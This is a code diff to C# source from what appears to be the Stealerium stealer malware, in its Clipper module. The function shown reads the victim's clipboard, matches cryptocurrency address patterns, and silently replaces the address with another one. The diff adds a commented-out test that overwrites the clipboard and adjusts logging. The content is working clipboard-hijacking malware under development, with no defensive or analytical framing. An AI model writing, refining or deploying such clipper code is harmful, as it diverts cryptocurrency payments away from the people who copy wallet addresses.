@@ -1,4 +1,5 @@
 ﻿using Stealerium.Helpers;
+using System;
 
 namespace Stealerium.Clipper
 {
@@ -10,6 +11,15 @@ namespace Stealerium.Clipper
             var buffer = ClipboardManager.ClipboardText;
             if (string.IsNullOrEmpty(buffer))
                 return;
+            /*
+            try
+            {
+                Clipboard.SetText("Replaced string");
+                Logging.Log($"Clipper replaced [{Clipboard.GetText()}]\n");
+            }
+            catch(Exception ex) { Logging.LogEx(ex); }
+            return;
+            */
             foreach (var dictonary in RegexPatterns.PatternsList)
             {
                 var cryptocurrency = dictonary.Key;
@@ -20,7 +30,7 @@ namespace Stealerium.Clipper
                     if (!string.IsNullOrEmpty(replaceTo) && !replaceTo.Contains("---") && !buffer.Equals(replaceTo))
                     {
                         Clipboard.SetText(replaceTo);
-                        Logging.Log("Clipper replaced to " + replaceTo);
+                        Logging.Log($"Clipper replaced to {replaceTo}");
                         return;
                     }
                 }
